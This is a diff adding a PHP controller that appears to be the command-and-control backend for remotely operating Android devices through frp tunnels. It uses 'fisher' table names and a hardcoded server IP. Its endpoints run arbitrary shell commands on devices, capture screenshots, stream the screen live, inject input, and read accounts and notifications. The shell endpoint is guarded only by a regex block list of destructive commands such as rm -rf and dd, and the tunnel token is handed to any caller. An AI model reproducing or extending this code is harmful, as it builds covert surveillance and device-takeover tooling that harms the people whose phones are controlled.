@@ -1,0 +1,877 @@
+<?php
+namespace app\controller;
+
+use app\BaseController;
+use think\facade\Db;
+use think\facade\Request;
+
+class TunnelController extends BaseController
+{
+    private const RECOVERY_PORT_OFFSET = 30000;
+    /**
+     * GET /api/tunnel/config
+     * local-service 获取 frpc 隧道配置
+     * 
+     * Go 响应结构体:
+     *   code=0, success=true, data.configINI = frpc INI 字符串
+     */
+    public function config()
+    {
+        if (Request::isPost()) {
+            return $this->updateConfig();
+        }
+
+        $deviceId = Request::get('deviceId', '') ?: Request::header('X-Device-ID', '');
+
+        // ★ 改进：彻底去掉 19901 跳板依赖
+        //   - 有 deviceId → 直接分配/查独立端口（推荐方案）
+        //   - 没 deviceId → 拒绝（防止新设备走 19901 跳板造成串设备）
+        if (empty($deviceId)) {
+            return json([
+                'success' => false,
+                'code'    => 400,
+                'message' => 'deviceId required',
+            ]);
+        }
+        $remotePort = $this->getOrAllocateRemotePort($deviceId);
+        $serverAddr = (string)env('frps.frps_addr', '38.76.184.172');
+        $serverPort = (int)env('frps.frps_port', 7000);
+        $localServicePort = (int)env('frps.local_service_port', 7912);
+        $token = env('frps.frps_token');
+        if (empty($token)) {
+            throw new \RuntimeException('FRPS_TOKEN 未配置，请在 .env 中设置 [FRPS] FRPS_TOKEN');
+        }
+
+        // ★ 改进：proxy name 改为 tunnel_<deviceId前8位>，与 node-ws 端一致
+        //   避免多设备共用 _local 名字被 frps 视为冲突
+        $proxyName = 'tunnel_' . substr($deviceId, 0, 8);
+        $configINI = "serverAddr = \"{$serverAddr}\"\n"
+            . "serverPort = {$serverPort}\n"
+            . "auth.method = \"token\"\n"
+            . "auth.token = \"{$token}\"\n"
+            . "transport.heartbeatInterval = 10\n"
+            . "transport.heartbeatTimeout = 30\n"
+            . "\n"
+            . "[[proxies]]\n"
+            . "name = \"{$proxyName}\"\n"
+            . "type = \"tcp\"\n"
+            . "localIP = \"127.0.0.1\"\n"
+            . "localPort = {$localServicePort}\n"
+            . "remotePort = {$remotePort}\n";
+
+        // 返回两种字段名格式，确保 Go 代码无论期望哪种都能匹配
+        return json([
+            'success'    => true,
+            'code'       => 0,
+            'serverAddr' => $serverAddr,
+            'serverPort' => $serverPort,
+            'token'      => $token,
+            'remotePort' => $remotePort,
+            'localPort'  => $localServicePort,
+            'configINI'  => $configINI,
+            'frpsAddr'   => $serverAddr,
+            'frpsPort'   => $serverPort,
+            'frpsToken'  => $token,
+            'data'       => [
+                'serverAddr' => $serverAddr,
+                'serverPort' => $serverPort,
+                'token'      => $token,
+                'remotePort' => $remotePort,
+                'localPort'  => $localServicePort,
+                'configINI'  => $configINI,
+                'frpsAddr'   => $serverAddr,
+                'frpsPort'   => $serverPort,
+                'frpsToken'  => $token,
+            ],
+        ]);
+    }
+
+    /**
+     * 获取或分配设备的 remote_port
+     * 端口范围: 19900-19999
+     */
+    private function getOrAllocateRemotePort($deviceId)
+    {
+        if (empty($deviceId)) {
+            throw new \RuntimeException('deviceId required for port allocation');
+        }
+
+        try {
+            // 1. 先查设备是否已分配端口（无锁快速路径）
+            $device = Db::table('fisher_devices')
+                ->where('device_id', $deviceId)
+                ->field('remote_port')
+                ->find();
+
+            if ($device && !empty($device['remote_port']) && (int)$device['remote_port'] >= 19902) {
+                return (int)$device['remote_port'];
+            }
+
+            // 2. 分配新端口：使用事务 + 行锁防止并发冲突
+            $conn = \think\facade\Db::connect();
+            $conn->startTrans();
+            try {
+                $maxPort = \think\facade\Db::table('fisher_devices')
+                    ->where('remote_port', '>=', 19902)
+                    ->where('remote_port', '<=', 29999)
+                    ->order('remote_port', 'desc')
+                    ->lock(true)
+                    ->value('remote_port');
+
+                $newPort = $maxPort ? (int)$maxPort + 1 : 19902;
+
+                // 跳过 19901 跳板（专用），从 19902 起
+                if ($newPort < 19902) {
+                    $newPort = 19902;
+                }
+
+                // 循环找下一个空闲端口（防止端口被野 frpc 占用）
+                $maxAttempts = 100;
+                $attempt = 0;
+                while ($attempt < $maxAttempts && $newPort <= 29999) {
+                    $occupied = \think\facade\Db::table('fisher_devices')
+                        ->where('remote_port', $newPort)
+                        ->where('device_id', '<>', $deviceId)
+                        ->count();
+                    if ($occupied == 0) {
+                        break;
+                    }
+                    $newPort++;
+                    $attempt++;
+                }
+
+                if ($newPort > 29999) {
+                    throw new \RuntimeException('No available ports (19902-29999 all occupied)');
+                }
+
+                // 保存到设备记录
+                \think\facade\Db::table('fisher_devices')
+                    ->where('device_id', $deviceId)
+                    ->update(['remote_port' => $newPort, 'tunnel_deployed' => 1]);
+
+                $conn->commit();
+                return $newPort;
+            } catch (\Exception $e) {
+                $conn->rollback();
+                throw $e;
+            }
+        } catch (\Exception $e) {
+            // 出错时 fallback 19902（不再用 19901 跳板）
+            return 19902;
+        }
+    }
+
+    /**
+     * POST /api/tunnel/config
+     * 更新隧道配置
+     */
+    public function updateConfig()
+    {
+        $data = Request::post();
+        // 存储到 settings 表
+        if (isset($data['frpsAddr'])) {
+            Db::table('fisher_settings')->replace(['key' => 'frps_addr', 'value' => $data['frpsAddr']]);
+        }
+        if (isset($data['frpsPort'])) {
+            Db::table('fisher_settings')->replace(['key' => 'frps_port', 'value' => (string)$data['frpsPort']]);
+        }
+
+        // ★ 修复 BUG#5：PHP 进程内 env() 是启动时缓存的，DB 更新不会立即生效
+        // 改为：读 DB 最新值，回写 .env 文件，让 PHP 重启后也能拿到最新值
+        $this->refreshFrpsConfigFromDb();
+
+        return json(['success' => true, 'data' => null, 'message' => 'success']);
+    }
+
+    /**
+     * 从 DB 刷新 frps 配置到 .env 文件
+     * 解决：ThinkPHP env() 单启动周期缓存，更新 DB 后下次重启生效
+     */
+    private function refreshFrpsConfigFromDb()
+    {
+        try {
+            $addrRow = Db::table('fisher_settings')->where('key', 'frps_addr')->find();
+            $portRow = Db::table('fisher_settings')->where('key', 'frps_port')->find();
+
+            // 同步到 .env 文件（让 PHP 重启后也生效）
+            $envFile = root_path() . '.env';
+            if (!is_file($envFile) || !is_writable($envFile)) {
+                return;
+            }
+            $envContent = file_get_contents($envFile);
+            if ($addrRow) {
+                $envContent = preg_replace(
+                    '/^FRPS_ADDR\s*=\s*.*$/m',
+                    'FRPS_ADDR = ' . $addrRow['value'],
+                    $envContent
+                );
+            }
+            if ($portRow) {
+                $envContent = preg_replace(
+                    '/^FRPS_PORT\s*=\s*.*$/m',
+                    'FRPS_PORT = ' . (int)$portRow['value'],
+                    $envContent
+                );
+            }
+            file_put_contents($envFile, $envContent);
+        } catch (\Exception $e) {
+            // 静默失败：DB 已更新，下次重启自然生效
+        }
+    }
+
+    /**
+     * GET /api/tunnel/status
+     * 隧道状态
+     */
+    public function status()
+    {
+        return json(['success' => true, 'data' => ['deployed' => true], 'message' => 'success']);
+    }
+
+    /**
+     * GET|POST /api/tunnel/deploy
+     * 标记隧道已部署（APK local-service 回调）
+     */
+    public function deployed()
+    {
+        $deviceId = Request::param('deviceId', '') ?: Request::header('X-Device-ID', '');
+        
+        if (!empty($deviceId)) {
+            try {
+                Db::table('fisher_devices')
+                    ->where('device_id', $deviceId)
+                    ->update(['tunnel_deployed' => 1, 'tunnel_deployed_at' => time()]);
+            } catch (\Exception $e) {
+                // 字段可能不存在，忽略
+            }
+        }
+
+        return json(['success' => true, 'data' => ['deployed' => true], 'message' => 'success']);
+    }
+
+    // ================================================================
+    // 以下接口从 Node.js index.js 迁移过来（2026-08-05）
+    // 原因：Node 主职责是 WS，这些纯 HTTP 代理接口放在 PHP 更稳定
+    // ================================================================
+
+    /**
+     * POST /api/tunnel/shell
+     * 通过隧道在设备上执行 shell 命令（代理到 local-service /execShell）
+     */
+    public function shell()
+    {
+        $cmd = Request::post('cmd', '');
+        $deviceId = Request::post('deviceId', '');
+
+        if (empty($cmd)) {
+            return json(['success' => false, 'error' => 'cmd required'], 400);
+        }
+
+        // 危险命令拦截
+        if (preg_match('/\b(rm\s+-rf|mkfs|dd\s+if=|format\s+|fdisk|parted)\b/i', $cmd)) {
+            return json(['success' => false, 'error' => 'Forbidden: dangerous command blocked'], 403);
+        }
+
+        $port = $this->getDeviceTunnelPort($deviceId);
+        $result = $this->proxyToLocalService($port, '/execShell', 'POST', json_encode(['command' => $cmd]), 10);
+        if ($result === false) {
+            $result = $this->proxyToLocalService($this->getRecoveryTunnelPort($port), '/execShell', 'POST', json_encode(['command' => $cmd]), 15);
+        }
+
+        if ($result === false) {
+            return json(['success' => false, 'error' => 'Tunnel error or timeout'], 502);
+        }
+
+        return response($result, 200, ['Content-Type' => 'application/json']);
+    }
+
+    /**
+     * POST /api/tunnel/input
+     * 代理 local-service 的触控/键事件（/tap, /swipe, /keyevent 等）
+     */
+    public function input()
+    {
+        $action = Request::post('action', '');
+        $params = Request::post('params', []);
+        $deviceId = Request::post('deviceId', '');
+
+        if (empty($action)) {
+            return json(['success' => false, 'error' => 'action required'], 400);
+        }
+
+        $port = $this->getDeviceTunnelPort($deviceId);
+
+        // 查询类命令用 GET，写入类命令用 POST
+        $getActions = ['isActiveDeviceOwner', 'deviceAdmin', 'listAccounts', 'getNotifications',
+                       'accessibilityState', 'screenState', 'getConfig',
+                       'windowListener/status', 'windowListener/getRules'];
+        $useGet = in_array($action, $getActions);
+
+        if ($useGet) {
+            $result = $this->proxyToLocalService($port, '/' . $action, 'GET', '', 10);
+        } else {
+            $result = $this->proxyToLocalService($port, '/' . $action, 'POST', json_encode($params ?: new \stdClass()), 10);
+        }
+        if ($result === false) {
+            $recoveryPort = $this->getRecoveryTunnelPort($port);
+            if ($useGet) {
+                $result = $this->proxyToLocalService($recoveryPort, '/' . $action, 'GET', '', 15);
+            } else {
+                $result = $this->proxyToLocalService($recoveryPort, '/' . $action, 'POST', json_encode($params ?: new \stdClass()), 15);
+            }
+        }
+
+        if ($result === false) {
+            return json(['success' => false, 'error' => 'Tunnel error or timeout'], 502);
+        }
+
+        return response($result, 200, ['Content-Type' => 'application/json']);
+    }
+
+    /**
+     * GET /api/tunnel/screenshot
+     * 代理 local-service 截图端点，返回原始 PNG
+     */
+    public function screenshot()
+    {
+        $deviceId = Request::get('deviceId', '');
+        $port = $this->getDeviceTunnelPort($deviceId);
+
+        $result = $this->proxyToLocalServiceRaw($port, '/screenshot', 'GET', '', 15);
+        if ($result === false) {
+            $result = $this->proxyToLocalServiceRaw($this->getRecoveryTunnelPort($port), '/screenshot', 'GET', '', 20);
+        }
+
+        if ($result === false) {
+            return json(['success' => false, 'error' => 'Tunnel error or timeout'], 502);
+        }
+
+        // 判断是否为 JSON（可能返回 base64）
+        if (strlen($result) > 0 && ($result[0] === '{' || $result[0] === '[')) {
+            $json = json_decode($result, true);
+            $b64 = $json['data']['output'] ?? $json['data'] ?? $json['screenshot'] ?? $json['base64'] ?? '';
+            if (is_string($b64) && strlen($b64) > 100) {
+                $imgBuf = base64_decode(preg_replace('/\s+/', '', $b64));
+                return response($imgBuf, 200, [
+                    'Content-Type' => 'image/png',
+                    'Content-Length' => strlen($imgBuf),
+                    'Cache-Control' => 'no-cache, no-store',
+                ]);
+            }
+        }
+
+        // 直接返回二进制 PNG
+        if (strlen($result) > 100) {
+            return response($result, 200, [
+                'Content-Type' => 'image/png',
+                'Content-Length' => strlen($result),
+                'Cache-Control' => 'no-cache, no-store',
+            ]);
+        }
+
+        return json(['success' => false, 'error' => 'Screenshot too small or empty'], 502);
+    }
+
+    /**
+     * GET /api/tunnel/minicap-stream
+     * 代理 local-service /minicap/stream 持续 MJPEG 视频流
+     * 返回 multipart/x-mixed-replace 流，浏览器 <img> 标签可直接消费
+     *
+     * 关键点：
+     * - X-Accel-Buffering: no 告知 Nginx 不要 buffer
+     * - CURLOPT_WRITEFUNCTION 透传流式响应，不缓冲到内存
+     * - 最长保持 120 秒，客户端重连时释放旧 PHP worker
+     */
+    public function minicapStream()
+    {
+        $deviceId = Request::get('deviceId', '');
+        $port = $this->getDeviceTunnelPort($deviceId);
+        if (!$this->checkPortAlive($port, 2)) {
+            $recoveryPort = $this->getRecoveryTunnelPort($port);
+            if ($this->checkPortAlive($recoveryPort, 3)) {
+                $port = $recoveryPort;
+            }
+        }
+
+        // ★ Nginx 关闭缓冲（重要！否则视频流会被 Nginx 缓冲在内存中）
+        header('X-Accel-Buffering: no');
+        header('Cache-Control: no-cache, no-store, must-revalidate');
+        header('Pragma: no-cache');
+
+        // 客户端关闭投屏后立即释放 PHP worker，避免长连接耗尽进程池。
+        ignore_user_abort(false);
+        set_time_limit(0);
+        while (ob_get_level() > 0) {
+            ob_end_flush();
+        }
+
+        $ch = curl_init("http://127.0.0.1:{$port}/minicap/stream");
+        curl_setopt_array($ch, [
+            CURLOPT_HTTPHEADER => [
+                'Authorization: Bearer ' . Request::header('Authorization', ''),
+                'X-Device-ID: ' . $deviceId,
+            ],
+            CURLOPT_WRITEFUNCTION => function ($ch, $data) {
+                if (connection_aborted()) {
+                    return 0;
+                }
+                // ★ 直接透传，不在 PHP 内存中缓冲
+                echo $data;
+                @ob_flush();
+                @flush();
+                return strlen($data);
+            },
+            CURLOPT_HEADERFUNCTION => function ($ch, $header) {
+                $len = strlen($header);
+                $header = trim($header);
+                if ($header && stripos($header, 'Transfer-Encoding') === false) {
+                    header($header, false);
+                }
+                return $len;
+            },
+            CURLOPT_TIMEOUT => 120,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_BUFFERSIZE => 8192,
+            CURLOPT_NOPROGRESS => true,
+            CURLOPT_FOLLOWLOCATION => true,
+        ]);
+
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+
+        if ($result === false && $httpCode !== 200) {
+            if (!connection_aborted()) {
+                header('Content-Type: application/json');
+                echo json_encode(['success' => false, 'error' => 'Minicap stream failed', 'httpCode' => $httpCode, 'detail' => $error]);
+            }
+        }
+        exit;
+    }
+
+    /**
+     * GET /api/tunnel/bootstrap
+     * 分配端口 + 通知 bridge + 轮询等待端口可达
+     */
+    public function bootstrap()
+    {
+        $deviceId = Request::get('deviceId', '');
+        if (empty($deviceId)) {
+            return json(['ok' => false, 'error' => 'deviceId required'], 400);
+        }
+
+        // 1. 获取或分配端口
+        $port = $this->getOrAllocateRemotePort($deviceId);
+
+        // 2. 检测端口是否已可达
+        if ($this->checkPortAlive($port)) {
+            return json(['ok' => true, 'status' => 'already_alive', 'remotePort' => $port]);
+        }
+
+        // 3. 通知 bridge（通过 Node WS 的 /internal/bridge-send）
+        $bridgeNotifyOk = false;
+        try {
+            $nodeWsPort = env('node_ws.port', 8889);
+            $payload = json_encode([
+                'deviceId' => $deviceId,
+                'message' => ['command' => 'setServerAddr', 'params' => ['serverAddr' => env('frps.server_addr', '38.76.184.172:8889')]]
+            ]);
+            $ch = curl_init("http://127.0.0.1:{$nodeWsPort}/internal/bridge-send");
+            curl_setopt_array($ch, [
+                CURLOPT_POST => true,
+                CURLOPT_POSTFIELDS => $payload,
+                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => 3,
+            ]);
+            $resp = curl_exec($ch);
+            curl_close($ch);
+            if ($resp) {
+                $r = json_decode($resp, true);
+                $bridgeNotifyOk = !empty($r['ok']);
+            }
+        } catch (\Exception $e) {
+            // ignore
+        }
+
+        // 4. 轮询等待端口可达（最多 10 秒）
+        $alive = false;
+        for ($i = 0; $i < 10; $i++) {
+            sleep(1);
+            if ($this->checkPortAlive($port)) {
+                $alive = true;
+                break;
+            }
+        }
+
+        if ($alive) {
+            Db::table('fisher_devices')->where('device_id', $deviceId)->update(['tunnel_deployed' => 1]);
+            return json(['ok' => true, 'status' => 'success', 'remotePort' => $port, 'bridgeNotified' => $bridgeNotifyOk]);
+        }
+
+        return json(['ok' => true, 'status' => 'pending', 'remotePort' => $port, 'bridgeNotified' => $bridgeNotifyOk,
+                     'message' => '已分配端口并通知 bridge，请等待设备下次拉取 config']);
+    }
+
+    /**
+     * GET|POST /api/tunnel/setDeviceId
+     * 通过隧道端口向设备推送 deviceId 配置
+     */
+    public function setDeviceId()
+    {
+        $deviceId = Request::param('deviceId', '');
+        if (empty($deviceId)) {
+            return json(['success' => false, 'error' => 'deviceId required'], 400);
+        }
+
+        $port = $this->getDeviceTunnelPort($deviceId);
+        $serverAddr = 'http://' . env('frps.server_addr', '38.76.184.172:8889');
+
+        // Step 1: 调用 /setAppConfig
+        $setAppConfigUrl = "/setAppConfig?deviceId=" . urlencode($deviceId) . "&serverAddr=" . urlencode($serverAddr);
+        $result1 = $this->proxyToLocalService($port, $setAppConfigUrl, 'GET', '', 3);
+
+        if ($result1 === false) {
+            return json(['success' => false, 'error' => "setAppConfig failed on port {$port}"], 502);
+        }
+
+        // Step 2: 调用 /setServerAddr
+        $setServerAddrUrl = "/setServerAddr?serverAddr=" . urlencode($serverAddr);
+        $result2 = $this->proxyToLocalService($port, $setServerAddrUrl, 'GET', '', 3);
+
+        // Step 3: 确保 DB 中有端口分配
+        $remotePort = $this->getOrAllocateRemotePort($deviceId);
+
+        return json([
+            'success' => true,
+            'message' => "deviceId={$deviceId} pushed via port {$port}. remotePort={$remotePort}",
+            'setAppConfig' => ['ok' => ($result1 !== false), 'port' => $port],
+            'setServerAddr' => ['ok' => ($result2 !== false)],
+            'workingPort' => $port,
+            'remotePort' => $remotePort,
+        ]);
+    }
+
+    // ================================================================
+    // 私有辅助方法
+    // ================================================================
+
+    /**
+     * 获取设备的隧道端口（仅查询，不分配）
+     */
+    private function getDeviceTunnelPort($deviceId)
+    {
+        if (empty($deviceId)) return 19901;
+
+        $device = Db::table('fisher_devices')
+            ->where('device_id', $deviceId)
+            ->field('remote_port')
+            ->find();
+
+        if ($device && !empty($device['remote_port']) && (int)$device['remote_port'] > 0) {
+            return (int)$device['remote_port'];
+        }
+
+        return 19901; // fallback
+    }
+
+    private function getRecoveryTunnelPort($primaryPort)
+    {
+        $port = (int)$primaryPort + self::RECOVERY_PORT_OFFSET;
+        return $port >= 1 && $port <= 65535 ? $port : 0;
+    }
+
+    /**
+     * HTTP 代理到 local-service（返回响应体字符串，失败返回 false）
+     */
+    private function proxyToLocalService($port, $path, $method = 'GET', $body = '', $timeout = 10)
+    {
+        $url = "http://127.0.0.1:{$port}{$path}";
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_CONNECTTIMEOUT => 3,
+        ]);
+
+        if (strtoupper($method) === 'POST') {
+            curl_setopt($ch, CURLOPT_POST, true);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Content-Length: ' . strlen($body)]);
+        }
+
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+
+        if ($result === false || $httpCode === 0) {
+            return false;
+        }
+
+        return $result;
+    }
+
+    /**
+     * HTTP 代理到 local-service（返回原始二进制数据）
+     */
+    private function proxyToLocalServiceRaw($port, $path, $method = 'GET', $body = '', $timeout = 15)
+    {
+        return $this->proxyToLocalService($port, $path, $method, $body, $timeout);
+    }
+
+    /**
+     * 检测本地端口是否可达
+     */
+    private function checkPortAlive($port, $timeout = 2)
+    {
+        $ch = curl_init("http://127.0.0.1:{$port}/health");
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_CONNECTTIMEOUT => $timeout,
+            CURLOPT_NOBODY => false,
+        ]);
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        return $httpCode >= 200 && $httpCode < 500;
+    }
+
+    // ================================================================
+    // 管理接口（从 Node /internal/ 迁移 — 2026-08-05）
+    // ================================================================
+
+    /**
+     * GET /api/tunnel/tunnel-status
+     * 隧道监控完整状态（原 Node /internal/tunnel-status）
+     */
+    public function tunnelStatus()
+    {
+        // 1. 查询所有设备端口分配
+        $devices = Db::table('fisher_devices')
+            ->where('remote_port', '>', 0)
+            ->whereOr('tunnel_deployed', 1)
+            ->field('device_id, remote_port, tunnel_deployed, last_seen, accessibility_alive, owner_username')
+            ->order('remote_port', 'asc')
+            ->select()
+            ->toArray();
+
+        // 2. 查询 frps Dashboard
+        $frpsProxies = $this->fetchFrpsProxies();
+
+        // 3. 检测 19901 跳板端口
+        $springboardAlive = $this->checkPortAlive(19901, 2);
+
+        // 4. 组合数据
+        $now = time();
+        $ports = [];
+        foreach ($devices as $d) {
+            $lastSeen = (int)($d['last_seen'] ?? 0);
+            $minutesSinceLastSeen = $lastSeen > 0 ? floor(($now - $lastSeen) / 60) : null;
+            $isSpringboard = (int)$d['remote_port'] === 19901;
+            $expectedProxyName = $isSpringboard ? '_local' : 'tunnel_' . substr($d['device_id'], 0, 8);
+
+            $frpsProxy = null;
+            foreach ($frpsProxies as $p) {
+                if (($p['name'] ?? '') === $expectedProxyName) {
+                    $frpsProxy = [
+                        'name' => $p['name'],
+                        'status' => $p['status'] ?? '',
+                        'clientVersion' => $p['client_version'] ?? '',
+                        'todayTrafficIn' => $p['today_traffic_in'] ?? 0,
+                        'todayTrafficOut' => $p['today_traffic_out'] ?? 0,
+                        'curConns' => $p['cur_conns'] ?? 0,
+                    ];
+                    break;
+                }
+            }
+
+            $ports[] = [
+                'port' => (int)$d['remote_port'],
+                'deviceId' => $d['device_id'],
+                'tunnelDeployed' => (bool)$d['tunnel_deployed'],
+                'lastSeen' => $lastSeen,
+                'minutesSinceLastSeen' => $minutesSinceLastSeen,
+                'accessibilityAlive' => (bool)($d['accessibility_alive'] ?? false),
+                'owner' => $d['owner_username'] ?? null,
+                'isSpringboard' => $isSpringboard,
+                'frpsProxy' => $frpsProxy,
+            ];
+        }
+
+        // 5. 未知 proxy（frps 上有但 DB 没对应设备）
+        $knownNames = array_filter(array_column($ports, 'frpsProxy'), fn($p) => $p !== null);
+        $knownProxyNames = array_column($knownNames, 'name');
+        $unknownProxies = [];
+        foreach ($frpsProxies as $p) {
+            $name = $p['name'] ?? '';
+            if ($name === '_local') continue;
+            if (in_array($name, $knownProxyNames)) continue;
+            $unknownProxies[] = [
+                'name' => $name,
+                'remotePort' => $p['conf']['remote_port'] ?? null,
+                'status' => $p['status'] ?? '',
+            ];
+        }
+
+        $usedPorts = count($ports);
+        $totalPorts = 29999 - 19902 + 1;
+        $springboardOccupant = null;
+        foreach ($ports as $p) {
+            if ($p['isSpringboard']) { $springboardOccupant = $p; break; }
+        }
+
+        return json([
+            'timestamp' => $now,
+            'springboard' => [
+                'port' => 19901,
+                'alive' => $springboardAlive,
+                'occupied' => $springboardOccupant !== null,
+            ],
+            'summary' => [
+                'totalPorts' => $totalPorts,
+                'usedPorts' => $usedPorts,
+                'freePorts' => $totalPorts - $usedPorts,
+                'frpsProxyCount' => count($frpsProxies),
+                'unknownProxyCount' => count($unknownProxies),
+            ],
+            'unknownProxies' => $unknownProxies,
+            'ports' => $ports,
+        ]);
+    }
+
+    /**
+     * POST /api/tunnel/close-frps-proxy
+     * 关闭 frps proxy（原 Node /internal/close-frps-proxy）
+     */
+    public function closeFrpsProxy()
+    {
+        if (!$this->isSuperAdmin()) {
+            return json(['ok' => false, 'error' => '需要超级管理员权限'], 403);
+        }
+
+        $proxyName = Request::param('proxyName', '');
+        $proxyType = Request::param('type', 'tcp');
+
+        if (empty($proxyName)) {
+            return json(['ok' => false, 'error' => 'proxyName required'], 400);
+        }
+        if (!preg_match('/^(tunnel_[A-Za-z0-9_-]{1,64}|_local)$/', $proxyName)) {
+            return json(['ok' => false, 'error' => 'invalid proxyName'], 400);
+        }
+        if (!in_array($proxyType, ['tcp', 'http'], true)) {
+            return json(['ok' => false, 'error' => 'invalid proxy type'], 400);
+        }
+
+        $host = env('frps.dashboard_host', '127.0.0.1');
+        $port = (int)env('frps.dashboard_port', 7500);
+        $user = env('frps.dashboard_user', 'admin');
+        $password = env('frps.dashboard_password', '');
+
+        $auth = base64_encode("{$user}:{$password}");
+        $url = "http://{$host}:{$port}/api/proxy/{$proxyType}/" . urlencode($proxyName);
+
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_CUSTOMREQUEST => 'DELETE',
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 5,
+            CURLOPT_HTTPHEADER => ["Authorization: Basic {$auth}"],
+        ]);
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        return json(['ok' => true, 'frps' => ['status' => $httpCode, 'body' => $result]]);
+    }
+
+    /**
+     * GET|DELETE /api/tunnel/blacklist
+     * 查询/清空端口释放黑名单（原 Node /internal/blacklist）
+     * 黑名单存储在 node-ws/released-ports.json
+     */
+    public function blacklist()
+    {
+        if (!$this->isSuperAdmin()) {
+            return json(['ok' => false, 'error' => '需要超级管理员权限'], 403);
+        }
+
+        $filePath = root_path() . '../node-ws/released-ports.json';
+
+        if (Request::isDelete()) {
+            // 清空黑名单
+            $data = ['ports' => [], 'proxyNames' => [], 'updatedAt' => date('c')];
+            file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
+            return json(['ok' => true, 'message' => 'blacklist cleared']);
+        }
+
+        // GET: 读取当前黑名单
+        if (!is_file($filePath)) {
+            return json(['ok' => true, 'ports' => [], 'proxyNames' => [], 'updatedAt' => null]);
+        }
+
+        $content = file_get_contents($filePath);
+        $data = json_decode($content, true) ?: [];
+
+        return json([
+            'ok' => true,
+            'ports' => $data['ports'] ?? [],
+            'proxyNames' => $data['proxyNames'] ?? [],
+            'updatedAt' => $data['updatedAt'] ?? null,
+        ]);
+    }
+
+    private function isSuperAdmin(): bool
+    {
+        $user = $this->request->user ?? $this->request->userPayload ?? [];
+        $userId = (int)($user['user_id'] ?? 0);
+        if ($userId <= 0) {
+            return false;
+        }
+
+        $role = Db::table('fisher_users')->where('id', $userId)->value('role');
+        return in_array($role, ['superadmin', 'super-admin'], true);
+    }
+
+    // ================================================================
+    // frps Dashboard API 辅助
+    // ================================================================
+
+    /**
+     * 从 frps Dashboard 获取所有 proxy 列表
+     */
+    private function fetchFrpsProxies()
+    {
+        $host = env('frps.dashboard_host', '127.0.0.1');
+        $port = (int)env('frps.dashboard_port', 7500);
+        $user = env('frps.dashboard_user', 'admin');
+        $password = env('frps.dashboard_password', '');
+
+        $auth = base64_encode("{$user}:{$password}");
+        $proxies = [];
+
+        foreach (['tcp', 'http'] as $type) {
+            $url = "http://{$host}:{$port}/api/proxy/{$type}";
+            $ch = curl_init($url);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => 5,
+                CURLOPT_HTTPHEADER => ["Authorization: Basic {$auth}"],
+            ]);
+            $result = curl_exec($ch);
+            curl_close($ch);
+
+            if ($result) {
+                $data = json_decode($result, true);
+                if (isset($data['proxies']) && is_array($data['proxies'])) {
+                    $proxies = array_merge($proxies, $data['proxies']);
+                }
+            }
+        }
+
+        return $proxies;
+    }
+}
